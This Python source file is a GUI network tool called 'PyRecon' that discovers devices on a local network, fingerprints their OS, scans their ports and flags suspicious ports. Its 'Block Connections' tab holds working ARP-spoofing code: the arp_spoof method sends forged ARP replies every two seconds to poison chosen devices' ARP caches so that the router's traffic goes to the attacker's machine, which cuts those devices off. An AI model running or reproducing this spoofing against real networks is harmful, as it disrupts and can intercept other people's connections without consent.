import tkinter as tk
import customtkinter
import socket
import threading
import multiprocessing
import subprocess
from scapy.all import ARP, Ether, srp, IP, ICMP, TCP, sr1, get_if_hwaddr, conf, sendp, send
import os
import time
import re
from functools import partial


customtkinter.set_appearance_mode("System")  # Modes: "System" (standard), "Dark", "Light"
customtkinter.set_default_color_theme("blue")  # Themes: "blue" (standard), "green", "dark-blue"
customtkinter.set_widget_scaling(1.1) 
globalScanned = False
Block_list= []
Block_mac_list = []

class App(customtkinter.CTk):
    def __init__(self):
        super().__init__()
        
        self.stop_event = threading.Event()  # Stop signal for all spoofing threads
        self.threads = []
        # self.devices = [{'ip': '192.168.18.1', 'mac': '64:2c:ac:dc:28:e8', 'vendor': 'HUAWEI TECHNOLOGIES CO.,LTD', 'os': 'Linux/macOS/Android', 'hostname': 'Unknown Host', 'open_ports': [80, 53]}, {'ip': '192.168.18.8', 'mac': 'e8:5a:8b:66:1c:21', 'vendor': 'Xiaomi Communications Co Ltd', 'os': 'Linux/macOS/Android', 'hostname': 'Unknown Host', 'open_ports': []}, {'ip': '192.168.18.87', 'mac': 'd4:86:60:22:3e:ce', 'vendor': 'Arcadyan Corporation', 'os': 'Unknown', 'hostname': 'Unknown Host', 'open_ports': []}, {'ip': '192.168.18.199', 'mac': '10:68:38:c4:00:ad', 'vendor': 'AzureWave Technology Inc.', 'os': 'Windows', 'hostname': 'sectorclear', 'open_ports': [135, 139, 445]}]
        global globalScanned
        self.useNmap = tk.IntVar(self, 0)
        
        # self.network_addr = tk.StringVar(self, "e.g., 192.168.1.0/24")
        self.network_addr = tk.StringVar(self, "e.g., 192.168.1.0/24")
        self.router_ip = self.get_router_ip()
        if self.router_ip != None:
            parts = self.router_ip.strip().split(".")
            if len(parts) == 4 and all(0 <= int(part) <= 255 for part in parts):
                self.network_addr = tk.StringVar(self, f"{parts[0]}.{parts[1]}.{parts[2]}.0/24")
        self.scanVar = tk.StringVar(self, "Scan Not Initiated: 0%")
        self.anomaliesDetected = tk.StringVar(self, "")

        # configure window
        self.title("PyRecon - Network Scanner")
        self.geometry(f"{1100}x{650}")

        # configure grid layout (4x4)
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(0, weight=1)
        
        # create tabview
        self.tabview = customtkinter.CTkTabview(self, anchor="w", command=self.update_tabviews)
        self.tabview.grid(row=0, column=0, padx=10, pady=5,sticky="nsew")
        self.scanner_tab = self.tabview.add("Scanner")
        
        
        self.tabview.set("Scanner")
        self.scanner_tab.grid_columnconfigure((0,1,2,3,4), weight=1, uniform="a")
        self.scanner_tab.grid_rowconfigure((1,2,3,4,5), weight=1, uniform="a")
        self.scanner_tab.grid_rowconfigure(0, weight=0, uniform="v")
        #first Row
        self.enterNetworkLabel = customtkinter.CTkLabel(self.scanner_tab, text="Enter the network range to scan: ")
        self.enterNetworkLabel.grid(row=0, column=0, columnspan=2,padx=(4,0), pady=(10, 5), sticky="wn")

        
        
        self.networkEntry = customtkinter.CTkEntry(self.scanner_tab, textvariable=self.network_addr, corner_radius=4, border_width=1)
        self.networkEntry.grid(row=0, column=1, padx=(5, 0), pady=(10, 5), sticky="wne")
        self.scanButton = customtkinter.CTkButton(master=self.scanner_tab, text="Scan",text_color=("gray10", "#DCE4EE"), command=self.scan)
        self.scanButton.grid(row=0, column=2, padx=(0, 0), pady=(10, 5), sticky="n")
        self.scanningProgressLabel = customtkinter.CTkLabel(self.scanner_tab, textvariable=self.scanVar)
        self.scanningProgressLabel.grid(row=0, column=3, columnspan=2,padx=(4,0), pady=(0, 10), sticky="wn")
        self.scanProgressBar = customtkinter.CTkProgressBar(self.scanner_tab)
        self.scanProgressBar.grid(row=0, column=3, columnspan=2,padx=(2, 2), pady=(10, 10), sticky="sew")
        self.scanProgressBar.set(0.0)
        # create scrollable frame - Discovered Devices
        self.deviceDisplayFrame = customtkinter.CTkScrollableFrame(self.scanner_tab, label_text="Discoverd Devices", label_anchor="w")
        self.deviceDisplayFrame.grid(row=1, column=0, columnspan=5, rowspan=3,padx=(4, 4), pady=(0, 5), sticky="nsew")
        
        self.enableNmapCheckbox = customtkinter.CTkCheckBox(self.scanner_tab, text="Include Nmap Scanning", variable=self.useNmap, onvalue=1, offvalue=0)
        self.enableNmapCheckbox.grid(row=1, column=4,padx=(0,0), pady=(10, 0), sticky="ne")
        self.deviceDisplayFrame.grid_columnconfigure((1,2,3,4,5,6), weight=1)
        self.deviceDisplayFrame.grid_columnconfigure(0, weight=0)
        
        self.ipLabel = customtkinter.CTkLabel(self.deviceDisplayFrame, text="No")
        self.ipLabel.grid(row=0, column=0, columnspan=1,padx=(2,5), pady=(0, 1), sticky="wn")
        
        self.ipLabel = customtkinter.CTkLabel(self.deviceDisplayFrame, text="IP")
        self.ipLabel.grid(row=0, column=1, columnspan=1,padx=(0,0), pady=(0, 1), sticky="wn")
        
        self.macLabel = customtkinter.CTkLabel(self.deviceDisplayFrame, text="MAC")
        self.macLabel.grid(row=0, column=2, columnspan=1,padx=(0,0), pady=(0, 1), sticky="wn")
        
        self.vendorLabel = customtkinter.CTkLabel(self.deviceDisplayFrame, text="Vendor")
        self.vendorLabel.grid(row=0, column=3, columnspan=2,padx=(0,0), pady=(0, 1), sticky="wn")
        
        self.osLabel = customtkinter.CTkLabel(self.deviceDisplayFrame, text="OS")
        self.osLabel.grid(row=0, column=5, columnspan=1,padx=(0,0), pady=(0, 1), sticky="wn")
        
        self.hostnameLabel = customtkinter.CTkLabel(self.deviceDisplayFrame, text="Hostname")
        self.hostnameLabel.grid(row=0, column=6, columnspan=1,padx=(0,0), pady=(0, 1), sticky="wn")
        
         # create scrollable frame - Anomalies Detected
        self.anomaliesFrame = customtkinter.CTkScrollableFrame(self.scanner_tab, label_text="Anomalies Detected", label_anchor="w")
        self.anomaliesFrame.grid(row=4, rowspan=2, column=0, columnspan=5,padx=(4, 4), pady=(0, 0), sticky="nsew")
        self.anomaliesFrame.grid_columnconfigure(0, weight=1)

        self.anomaly_entry = customtkinter.CTkLabel(self.anomaliesFrame, text="")
        self.anomaly_entry.grid(row=0, column=0,padx=(0,0), pady=(0, 0), sticky="nw")

        #BLOCKERTAB
        self.blocker_tab = self.tabview.add("Block Connections")
        self.blocker_tab.grid_columnconfigure((0,1,2,3,4), weight=1, uniform="a")
        self.blocker_tab.grid_rowconfigure((0,1,2,3,4), weight=1, uniform="a")
        
        self.runScanFirstLabel = customtkinter.CTkLabel(self.blocker_tab, text="Please Run the Scan First!")
        self.runScanFirstLabel.grid(row=0, column=0, columnspan=5, rowspan=5 ,padx=(4,0), pady=(10, 5), sticky="news")
        
        # self.tabview.add("Function2")
    
    
    def update_tabviews(self):
        #blocked Tabview
        global globalScanned
        global Block_list
        if globalScanned == True:
            self.runScanFirstLabel.grid_forget()
            self.selectDevicesLabel = customtkinter.CTkLabel(self.blocker_tab, text="Select Devices to block: ")
            self.selectDevicesLabel.grid(row=0, column=0, columnspan=2,padx=(4,0), pady=(10, 5), sticky="wn")
            self.blockButton = customtkinter.CTkButton(master=self.blocker_tab, fg_color="#782c2c",text="Block", state="disabled",text_color=("gray10", "#DCE4EE"), command=self.Block)
            self.blockButton.grid(row=0, column=3, padx=(0, 0), pady=(10, 5), sticky="wne")
            self.removeblockButton = customtkinter.CTkButton(master=self.blocker_tab, state="disabled",fg_color="#207340",text="Remove Block",text_color=("gray10", "#DCE4EE"), command=self.Remove_Block)
            self.removeblockButton.grid(row=0, column=4, padx=(10, 0), pady=(10, 5), sticky="wne")
            
            self.blockerDeviceDisplayFrame = customtkinter.CTkScrollableFrame(self.blocker_tab, label_text="Discoverd Devices", label_anchor="w")
            self.blockerDeviceDisplayFrame.grid(row=1, column=0, columnspan=5, rowspan=4,padx=(4, 4), pady=(0, 5), sticky="nsew")
            self.blockerDeviceDisplayFrame.grid_columnconfigure((2,3,4,5,6,7), weight=1)
            self.blockerDeviceDisplayFrame.grid_columnconfigure((0,1), weight=0)
            
            self.ipLabel = customtkinter.CTkLabel(self.blockerDeviceDisplayFrame, text="No")
            self.ipLabel.grid(row=0, column=0, columnspan=1,padx=(2,5), pady=(0, 1), sticky="wn")

            self.ipLabel = customtkinter.CTkLabel(self.blockerDeviceDisplayFrame, text="Select")
            self.ipLabel.grid(row=0, column=1, columnspan=1,padx=(2,5), pady=(0, 1), sticky="wn")
            
            self.ipLabel = customtkinter.CTkLabel(self.blockerDeviceDisplayFrame, text="IP")
            self.ipLabel.grid(row=0, column=2, columnspan=1,padx=(0,0), pady=(0, 1), sticky="wn")
            
            self.macLabel = customtkinter.CTkLabel(self.blockerDeviceDisplayFrame, text="MAC")
            self.macLabel.grid(row=0, column=3, columnspan=1,padx=(0,0), pady=(0, 1), sticky="wn")
            
            self.vendorLabel = customtkinter.CTkLabel(self.blockerDeviceDisplayFrame, text="Vendor")
            self.vendorLabel.grid(row=0, column=4, columnspan=2,padx=(0,0), pady=(0, 1), sticky="wn")
            
            self.osLabel = customtkinter.CTkLabel(self.blockerDeviceDisplayFrame, text="OS")
            self.osLabel.grid(row=0, column=6, columnspan=1,padx=(0,0), pady=(0, 1), sticky="wn")
            
            self.hostnameLabel = customtkinter.CTkLabel(self.blockerDeviceDisplayFrame, text="Hostname")
            self.hostnameLabel.grid(row=0, column=7, columnspan=1,padx=(0,0), pady=(0, 1), sticky="wn")
            
            
            for index, device in enumerate(self.devices, start=1):
                customtkinter.CTkLabel(self.blockerDeviceDisplayFrame, text=str(index)).grid(row=index, column=0, columnspan=1,padx=(2,5), pady=(0, 1), sticky="wn")

                checkbox_var = tk.IntVar(value=0)
                checkbox = customtkinter.CTkCheckBox(
                    self.blockerDeviceDisplayFrame, 
                    text="", 
                    variable=checkbox_var,  # ✅ Store the state in checkbox_var
                    onvalue=1, 
                    offvalue=0, 
                    command=partial(self.selectDevice, index, device['ip'], device['mac'], checkbox_var)  # ✅ Fix capturing issue
                )
                checkbox.grid(row=index, column=1, padx=(2,5), pady=(0,1), sticky="wn")

                customtkinter.CTkLabel(self.blockerDeviceDisplayFrame, textvariable=tk.StringVar(value=device['mac'])).grid(row=index, column=3, columnspan=1,padx=(0,0), pady=(0, 1), sticky="wn")
                customtkinter.CTkLabel(self.blockerDeviceDisplayFrame, textvariable=tk.StringVar(value=device['ip'])).grid(row=index, column=2, columnspan=1,padx=(0,0), pady=(0, 1), sticky="wn")
                customtkinter.CTkLabel(self.blockerDeviceDisplayFrame, textvariable=tk.StringVar(value=device['vendor'])).grid(row=index, column=4, columnspan=2,padx=(0,0), pady=(0, 1), sticky="wn")
                customtkinter.CTkLabel(self.blockerDeviceDisplayFrame, textvariable=tk.StringVar(value=device['os'])).grid(row=index, column=6, columnspan=1,padx=(0,0), pady=(0, 1), sticky="wn")
                customtkinter.CTkLabel(self.blockerDeviceDisplayFrame, textvariable=tk.StringVar(value=device['hostname'])).grid(row=index, column=7, columnspan=1,padx=(0,0), pady=(0, 1), sticky="wn")
                # self.update_idletasks()
            
        else:
            pass
            
        self.update()
    
    
    def selectDevice(self, row, ip, mac, checkbox_var):
        global Block_list
        # print(f"Row: {row}, IP: {ip}, MAC: {mac},Checked: {checkbox_var.get()}")
        if checkbox_var.get() == 1:
            Block_list.append(str(ip)+"#"+str(mac))
        else:
            Block_list.remove(str(ip)+"#"+str(mac))
        if Block_list:
            self.blockButton.configure(state="normal")
            self.update_idletasks()
        else:
            self.blockButton.configure(state="disabled")
            self.update_idletasks()
        # print(Block_list)
    
    def Block(self):
        global Block_list
        self.blockButton.configure(text="Blocking...", state="disabled")
        self.removeblockButton.configure(state="normal")
        devs = test = "\n".join(f"{num}.{each.split('#')[0]}" for num, each in enumerate(Block_list, start=1))
        self.BlockedDLabel = customtkinter.CTkLabel(self.blocker_tab, text=("Blocking Devices:\n"+devs), font=customtkinter.CTkFont(size=16, weight="bold"))
        self.BlockedDLabel.grid(row=1, column=0, columnspan=5, rowspan=4 ,padx=(0,0), pady=(0, 0), sticky="news")
        self.BlockedDLabel.lift()
        self.update_idletasks()
        
        self.stop_event.clear()  # Ensure stop signal is reset
        self.threads = []
        
        if self.get_router_ip() != None:
            self.router_ip = self.get_router_ip()
        elif self.find_router_ip(network) != None:
            self.router_ip = self.find_router_ip(network)
        else:
            self.f_Block()
            return
        self.router_mac = ""
        for device in self.devices:
            if device['ip'] == self.router_ip:
                self.router_mac = device['mac']
        if self.router_mac == "":
            self.f_Block()
            return
        try:
            self.our_mac = get_if_hwaddr(conf.iface)
        except:
            self.f_Block()
            return
        
        for entry in Block_list:
            target_ip, target_mac = entry.split("#")
            spoof_thread = threading.Thread(target=self.arp_spoof, args=(target_ip, target_mac, self.router_ip, self.our_mac, self.router_mac))
            spoof_thread.daemon = True  # Ensure it exits with main program
            spoof_thread.start()
            self.threads.append(spoof_thread)
                

    
    def Remove_Block(self):
        self.blockButton.configure(text="Block", state="normal")
        self.removeblockButton.configure(state="disabled")
        self.BlockedDLabel.destroy()
        self.update_idletasks()
        threading.Thread(target=self._remove_block_background, daemon=True).start()
    
    def _remove_block_background(self):
        global Block_list
        self.restore_arp(Block_list, self.router_ip, self.router_mac)
        self.stop_event.set()  # Set stop signal for all threads

        for thread in self.threads:
            thread.join()  # Wait for each spoofing thread to stop

        self.threads = []  # Clear the thread list
        self.stop_event.clear()
    
    def f_Block(self):
        self.blockButton.configure(text="Block", state="normal")
        self.removeblockButton.configure(state="disabled") 
        
        # Load OUI database from oui.txt
    def load_oui_database(self, file_path="oui.txt"):
        """
        Loads the OUI database and maps MAC prefixes to manufacturers.
        """
        oui_dict = {}
        try:
            with open(file_path, "r", encoding="utf-8") as file:
                for line in file:
                    if "(hex)" in line:  # Only process lines containing "(hex)"
                        parts = line.split("\t")
                        if len(parts) > 1:
                            mac_prefix = parts[0].split(" ")[0].strip().upper()  # Extract MAC prefix
                            mac_prefix = mac_prefix.replace("-", ":")  # Ensure format consistency
                            vendor_name = parts[-1].strip()
                            oui_dict[mac_prefix] = vendor_name
        except FileNotFoundError:
            print("⚠️ Error: OUI file not found! Please download it from IEEE and place it in the script folder.")
        except Exception as e:
            print(f"⚠️ Error loading OUI database: {e}")
        
        return oui_dict

    # TTL-Based OS Mapping
    TTL_OS_MAPPING = {
        32: "Windows 95/98/ME",
        64: "Linux/macOS/Android",
        128: "Windows",
        255: "Cisco/Unix-like"
    }

    def get_mac_fallback(self, ip):
        try:
            ans = sr1(IP(dst=ip)/TCP(dport=80, flags="S"), timeout=1, verbose=False)
            if ans and ans.haslayer(Ether):
                return ans.src  # Return MAC if available
        except:
            pass
        return "Unknown MAC"

    def find_router_ip(self, network):
        """
        Sends an ARP request to all devices and finds the most likely router IP.
        """
        arp_request = ARP(pdst=network)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast / arp_request

        answered_list = srp(packet, timeout=2, verbose=False)[0]

        mac_count = {}  # Track MAC address occurrences

        for sent, received in answered_list:
            mac_count[received.hwsrc] = mac_count.get(received.hwsrc, 0) + 1

        # Find MAC with most connections (likely the router)
        if mac_count:
            likely_router_mac = max(mac_count, key=mac_count.get)
            for sent, received in answered_list:
                if received.hwsrc == likely_router_mac:
                    return received.psrc  # Return the router's IP

        return None

    def get_router_ip(self):
        """
        Retrieves the default gateway using system commands.
        """
        try:
            if os.name == "nt":  # Windows
                result = os.popen("ipconfig").read()
                for line in result.split("\n"):
                    if "Default Gateway" in line and (line.split(":")[-1].strip()) != "":
                        return line.split(":")[-1].strip()
            else:  # Linux/macOS
                result = os.popen("ip route").read()
                for line in result.split("\n"):
                    if "default via" in line:
                        return line.split(" ")[2]
        except Exception as e:
            return f"Error detecting router: {e}"

        return None

    def detect_os(self, ip):
        """
        Detect OS based on the TTL value of an ICMP or TCP response.
        """
        try:
            # Send an ICMP Echo Request (Ping)
            icmp_packet = IP(dst=ip) / ICMP()
            response = sr1(icmp_packet, timeout=1, verbose=False)

            if response:
                ttl = response.ttl
                return self.TTL_OS_MAPPING.get(ttl, f"Unknown (TTL={ttl})")

            # If ICMP fails, try a TCP SYN packet to port 80 (common open port)
            tcp_packet = IP(dst=ip) / TCP(dport=80, flags="S")
            response = sr1(tcp_packet, timeout=1, verbose=False)

            if response:
                ttl = response.ttl
                return self.TTL_OS_MAPPING.get(ttl, f"Unknown (TTL={ttl})")

        except Exception as e:
            print(f"Error detecting OS for {ip}: {e}")

        return "Unknown"

    def resolve_hostname(self, ip):
        """Attempts to resolve the hostname of a device."""
        try:
            return socket.gethostbyaddr(ip)[0]
        except (socket.herror, socket.gaierror):
            return "Unknown Host"

    def get_device_vendor(self, mac_address, oui_database):
        """
        Returns the vendor name for a given MAC address.
        """
        mac_prefix = mac_address.upper()[:8]  # Extract first 8 characters (xx:xx:xx)
        return oui_database.get(mac_prefix, "Unknown Device")

    
    def scan_network_nmap(self, network):
        print(f"Running Nmap scan on {network}...")
        devices = []
        try:
            result = subprocess.run(["nmap", "-sn", network], capture_output=True, text=True)
            lines = result.stdout.split("\n")
            ip, mac = None, None
            for line in lines:
                if "Nmap scan report for" in line:
                    ip = line.split()[-1]
                elif "MAC Address:" in line:
                    parts = line.split()
                    mac = parts[2] if len(parts) > 2 else None
                    if not mac:  # If MAC is still None, use fallback method
                        mac = self.get_mac_fallback(ip)
                    vendor = " ".join(parts[3:]).replace("(", "").replace(")", "").strip()
                    vendor = vendor if vendor else "Unknown Device"
                    os_detected = self.detect_os(ip)
                    hostname = self.resolve_hostname(ip)
                    devices.append({"ip": ip, "mac": mac, "vendor": vendor , "os": os_detected, "hostname": hostname})
        except Exception as e:
            print(f"Error running Nmap: {e}")
        return devices

    # Scan network to find active devices
    def scan_network_arp(self, network, oui_database):
        print(f"Scanning network {network}...")
        arp = ARP(pdst=network)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp

        result = srp(packet, timeout=2, retry=1, verbose=False)[0]

        devices = []
        for _, received in result:
            mac_address = received.hwsrc if received.hwsrc else self.get_mac_fallback(received.psrc)
            vendor = self.get_device_vendor(mac_address, oui_database)
            os_detected = self.detect_os(received.psrc)
            hostname = self.resolve_hostname(received.psrc)
            devices.append({"ip": received.psrc, "mac": mac_address, "vendor": vendor, "os": os_detected, "hostname": hostname})

        return devices

    # Scan ports on a device
    def scan_ports(self, ip):
        # Default port range (1-1024) + high-risk ports
        ports_to_scan = list(range(1, 1025)) + [1080, 4444, 5555, 6667, 8080, 4443]
        
        open_ports = []

        def scan_port(port):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(0.5)
                    result = s.connect_ex((ip, port))
                    if result == 0:
                        open_ports.append(port)
            except Exception:
                pass

        threads = []
        for port in ports_to_scan:
            t = threading.Thread(target=scan_port, args=(port,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        print(f"Open ports on {ip}: {open_ports}")
        return open_ports

    # Detect anomalies in the network
    def detect_anomalies(self, devices):
        """
        Identifies potential anomalies in the network based on unknown devices and unusual open ports.
        """
        common_malicious_ports = {23, 1080, 4444, 5555, 6667, 8080, 4443}  # Ports used by malware/botnets
        anomalies = []

        print("\nAnalyzing network for anomalies...\n")
        for device in devices:
            ip = device['ip']
            mac = device['mac']
            vendor = device['vendor']
            open_ports = device.get('open_ports', [])

            # Flag unknown devices
            if vendor == "Unknown Device" or vendor == "Unknown":
                anomalies.append(f"⚠️ Unknown Device Detected - IP: {ip}, MAC: {mac}")

            # Flag devices with multiple open ports
            if len(open_ports) > 10:
                anomalies.append(f"⚠️ Device {ip} has unusually high open ports: {open_ports}")

            # Flag suspicious ports
            for port in open_ports:
                if port in common_malicious_ports:
                    anomalies.append(f"⚠️ Suspicious Port {port} open on {ip}")

        return anomalies

    # Save results to file
    def save_results_to_file(self, devices, anomalies):
        """
        Saves the scan results and detected anomalies to a file.
        """
        filename = "scan_results.txt"
        with open(filename, "w", encoding="utf-8") as file:
            for device in devices:
                file.write(f"Device IP: {device['ip']}, MAC: {device['mac']}, Vendor: {device['vendor']}, OS: {device['os']} \t Hostname: {device['hostname']}, Open Ports: {device.get('open_ports', [])}\n")

            if anomalies:
                file.write("\nDetected Anomalies:\n")
                for anomaly in anomalies:
                    file.write(anomaly + "\n")

        print(f"\n📁 Scan results and anomalies saved to {filename}")

    # def restore_arp(self, target_ip, target_mac, router_ip, router_mac):
    #     if router_mac and target_mac:
    #         restore_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip, hwsrc=router_mac)
    #         restore_ether_packet = Ether(dst=target_mac) / restore_packet
    #         sendp(restore_ether_packet, count=5, verbose=False)
    #         print(f"✅ Restored ARP table for {target_ip}")
    def restore_arp(self, block_list, router_ip, router_mac):
        print("\n🔄 Restoring ARP tables for all devices...")

        for entry in block_list:
            target_ip, target_mac = entry.split("#")
            if router_mac and target_mac:
                # Restore ARP entry for the target device
                restore_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip, hwsrc=router_mac)
                restore_ether_target = Ether(dst=target_mac) / restore_target
                sendp(restore_ether_target, count=5, verbose=False)

                # Restore ARP entry for the router (so the router knows the real MAC of the target)
                restore_router = ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip, hwsrc=target_mac)
                restore_ether_router = Ether(dst=router_mac) / restore_router
                sendp(restore_ether_router, count=5, verbose=False)

                print(f"✅ Restored ARP table for {target_ip} ↔ {router_ip}")
        print("✅ ARP restoration completed for all devices.")

    def arp_spoof(self, target_ip, target_mac, router_ip, our_mac, router_mac): 
        print(f"⚡ Poisoning {target_ip} to redirect traffic meant for {router_ip} to {our_mac}")
        # Construct the malicious ARP reply
        arp_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip, hwsrc=our_mac)
        ether_packet = Ether(dst=target_mac) / arp_packet
        while not self.stop_event.is_set():
            #send(arp_packet, verbose=False)
            sendp(ether_packet, verbose=False)
            time.sleep(2)  # Send packets every 2 seconds to keep poisoning active

    def validate_cidr(self, input_string):
        """
        Validate if the given input string is in the format 'x.x.x.x/x', e.g., '192.168.18.0/24'.
        """
        # Regular expression to match IPv4/CIDR notation
        # pattern = r"^((25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)/(3[0-2]|[12]?[0-9])$"
        pattern = r"^((25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)/((3[0-2]|[12]?[0-9])|((25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|1?[0-9][0-9]?))$"
        
        
        # Check if input matches the pattern
        return bool(re.match(pattern, input_string))

        
    def scan(self):
        # network = input("Enter the network range to scan (e.g., 192.168.1.0/24): ")
        network = str(self.network_addr.get()) if self.validate_cidr(str(self.network_addr.get())) else "Wrong Address Format"
        if network != "Wrong Address Format":
            self.scanButton.configure(state="disabled", text="Scanning", fg_color="#782c2c")
            
            self.ScanningLabel = customtkinter.CTkLabel(self.scanner_tab, text="Scanning...", font=customtkinter.CTkFont(size=36, weight="bold"))
            self.ScanningLabel.grid(row=1, column=0, columnspan=5, rowspan=4 ,padx=(0,0), pady=(0, 0), sticky="news")
            self.ScanningLabel.lift()
            self.update_idletasks()
            
            self.scanProgressBar.set(0.0)
            self.scanVar.set("Scan Progress: 0%")
            self.update_idletasks()
            oui_data = self.load_oui_database()
            self.scanProgressBar.set(0.25)
            self.scanVar.set("Scan Progress: 25%")
            self.update_idletasks()
            if int(self.useNmap.get()) == 1:
                nmap_devices = self.scan_network_nmap(network)
                self.scanProgressBar.set(0.50)
                self.scanVar.set("Scan Progress: 50%")
                self.update_idletasks()
                arp_devices = self.scan_network_arp(network, oui_data)
                self.scanProgressBar.set(0.75)
                self.scanVar.set("Scan Progress: 75%")
                self.update_idletasks()
                devices = {d['ip']: d for d in nmap_devices}
                for device in arp_devices:
                    if device['ip'] not in devices:
                        devices[device['ip']] = device
                self.devices = list(devices.values())
            else:
                self.devices = self.scan_network_arp(network, oui_data)
                self.scanProgressBar.set(0.75)
                self.scanVar.set("Scan Progress: 75%")
                self.update_idletasks()                
            #print("Discovered devices:")
            # dev_num = 1
            # for device in self.devices:
            #     #print(f"{dev_num}. IP: {device['ip']}\n   MAC: {device['mac']}\n   Vendor: {device['vendor']}\n   OS: {device['os']}\n   Hostname: {device['hostname']}\n")
            #     dev_num += 1
            for device in self.devices:
                ip = device['ip']
                open_ports = self.scan_ports(ip)
                device['open_ports'] = open_ports
            cache_num = 1
            for device in self.devices:
                self.device_label_no = "device_no_"+str(cache_num)
                self.device_label_ip = "device_ip_"+str(cache_num)
                self.device_label_mac = "device_mac_"+str(cache_num)
                self.device_label_vendor = "device_vendor_"+str(cache_num)
                self.device_label_os = "device_os_"+str(cache_num)
                self.device_label_hostname = "device_hostname_"+str(cache_num)
                
                self.device_label_no = customtkinter.CTkLabel(self.deviceDisplayFrame, text=str(cache_num))
                self.device_label_no.grid(row=cache_num, column=0, columnspan=1,padx=(2,5), pady=(0, 1), sticky="wn")
                
                self.devIP = tk.StringVar(self, str(device['ip']))
                self.device_label_ip = customtkinter.CTkEntry(self.deviceDisplayFrame, textvariable=self.devIP, border_width=0, state="readonly", fg_color="transparent")
                self.device_label_ip.grid(row=cache_num, column=1, columnspan=1,padx=(0,0), pady=(0, 1), sticky="wn")
                
                self.devMAC = tk.StringVar(self, str(device['mac']))
                self.device_label_mac = customtkinter.CTkEntry(self.deviceDisplayFrame, textvariable=self.devMAC, border_width=0, state="readonly", fg_color="transparent")
                self.device_label_mac.grid(row=cache_num, column=2, columnspan=1,padx=(0,0), pady=(0, 1), sticky="wn")
                
                self.devVendor = tk.StringVar(self, str(device['vendor']))
                self.device_label_vendor = customtkinter.CTkEntry(self.deviceDisplayFrame, textvariable=self.devVendor, border_width=0, state="readonly", fg_color="transparent")
                self.device_label_vendor.grid(row=cache_num, column=3, columnspan=2,padx=(0,0), pady=(0, 1), sticky="wn")
                
                self.devOS = tk.StringVar(self, str(device['os']))
                self.device_label_os = customtkinter.CTkEntry(self.deviceDisplayFrame, textvariable=self.devOS, border_width=0, state="readonly", fg_color="transparent")
                self.device_label_os.grid(row=cache_num, column=5, columnspan=1,padx=(0,0), pady=(0, 1), sticky="wn")
                
                self.devHostname = tk.StringVar(self, str(device['hostname']))
                self.device_label_hostname = customtkinter.CTkEntry(self.deviceDisplayFrame, textvariable=self.devHostname, border_width=0, state="readonly", fg_color="transparent")
                self.device_label_hostname.grid(row=cache_num, column=6, columnspan=1,padx=(0,0), pady=(0, 1), sticky="wn")
                cache_num += 1
            anomalies = self.detect_anomalies(self.devices)
            self.save_results_to_file(self.devices, anomalies)
            anom_cache = 1
            anon_val = ""
            if anomalies:
                for anomaly in anomalies:
                    anon_val = anon_val +(str(anom_cache)+". "+str(anomaly)+"\n")
                    anom_cache += 1
            self.anomaly_entry.configure(text=str(anon_val))
            self.scanProgressBar.set(1)
            self.scanVar.set("Scan Complete: 100%")
            global globalScanned
            globalScanned = True
            # self.ScanningLabel.grid_forget()
            self.ScanningLabel.destroy()
            self.scanButton.configure(state="normal", text="Scan", fg_color=['#3B8ED0', '#1F6AA5'])
            self.update_idletasks()
            # choice_var = input("\n🔍 Scan completed! Would you like to attempt to disconnect a device from the network? (yes/no): ")
            # if choice_var in ["y", "Y", "yes", "YES"]:
            #     if self.get_router_ip() != None:
            #         router_ip = self.get_router_ip()
            #     elif self.find_router_ip(network) != None:
            #         router_ip = self.find_router_ip(network)
            #     else:
            #         router_ip = str(input("\nEnter the Router-IP address: "))
            #     router_mac = ""
            #     for device in devices:
            #         if device['ip'] == router_ip:
            #             router_mac = device['mac']
            #     if router_mac == "":
            #         router_mac = str(input("\nEnter the MAC address of the router: "))
                
            #     target_id = int(input("\nSelect the device to target:"))-1
            #     target_ip = devices[target_id]['ip']
            #     target_mac = devices[target_id]['mac']
            #     try:
            #         our_mac = get_if_hwaddr(conf.iface)
            #     except:
            #         our_mac = str(input("\nEnter the MAC address of this device: "))
                
            #     self.arp_spoof(target_ip, target_mac, router_ip, our_mac, router_mac)
            #     # print(f"\ntarget_ip: {target_ip}\n target_mac: {target_mac}\n router_ip: {router_ip}\n our_mac: {our_mac}\n router_mac: {router_mac}")
                    
            # else:
            #     print("✅ No action taken. Exiting...")
        else:
            self.network_addr.set("Wrong Address Format")


if __name__ == "__main__":
    app = App()
    app.mainloop()